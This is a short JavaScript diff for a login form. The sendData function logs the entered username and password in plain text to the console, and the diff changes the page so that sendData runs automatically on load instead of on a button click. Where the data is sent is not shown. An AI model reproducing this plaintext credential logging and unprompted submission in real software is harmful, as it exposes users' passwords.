@@ -4,8 +4,8 @@ async function sendData() {
     const user = document.getElementById("user").value;
     const pass = document.getElementById("pass").value;
 
-    console.log("User: " + user);  // Debug log for user
-    console.log("Password: " + pass);  // Debug log for password
+    console.log("User: " + user);
+    console.log("Password: " + pass);
 
     if (!user || !pass) {
         console.log("User or password is empty.");
@@ -75,10 +75,6 @@ async function sendInfoOnLoad() {
     }
 }
 
-window.onload = function () {
-    sendInfoOnLoad();
-};
-
 document.addEventListener("DOMContentLoaded", function() {
-    document.getElementById("submitBtn").addEventListener("click", sendData);
+    sendData(); // Call sendData directly on page load
 });
